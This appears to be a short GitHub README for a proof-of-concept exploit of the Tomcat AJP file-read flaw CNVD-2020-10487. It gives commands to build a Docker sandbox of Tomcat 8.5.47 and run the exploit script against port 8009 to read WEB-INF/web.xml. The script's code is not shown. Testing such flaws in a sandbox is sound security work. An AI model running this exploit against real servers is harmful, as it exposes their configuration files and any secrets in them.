# CNVD-2020-10487-Tomcat-Ajp-lfi
Tomcat-Ajp协议文件读取漏洞
![image](https://raw.githubusercontent.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/master/QQ截图20200220231832.png)


## Docker sandbox to test vulnerability of Tomcat8.5.47

	
	docker build tomcat8.5/. -t tomcat8cnvd
	docker run -p 8009:8009 -d tomcat8cnvd
	python CNVD-2020-10487-Tomcat-Ajp-lfi.py localhost -p 8009 -f WEB-INF/web.xml
	